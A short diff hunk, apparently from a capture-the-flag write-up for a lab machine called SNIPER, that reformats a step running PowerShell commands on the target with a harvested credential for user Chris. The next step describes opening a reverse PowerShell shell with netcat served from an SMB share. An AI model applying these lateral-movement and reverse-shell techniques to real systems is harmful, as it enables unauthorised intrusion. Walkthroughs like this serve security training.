@@ -38,7 +38,8 @@ The filename-construction pattern (user_input + extensions → blog-es.php) is a
 `$cred = New-Object  System.Management.Automation.PSCredential("SNIPER\\Chris", $pass)`
 
 Check to see if it was successful 
-` Invoke-Command -ComputerName SNIPER -Credential $cred -ScriptBlock {whoami} `
+
+`Invoke-Command -ComputerName SNIPER -Credential $cred -ScriptBlock {whoami} `
 
 9. Run netcat from an SMB share on SNIPER (authenticating as $cred) to create a reverse PowerShell shell back to our machine as Chris. 
 
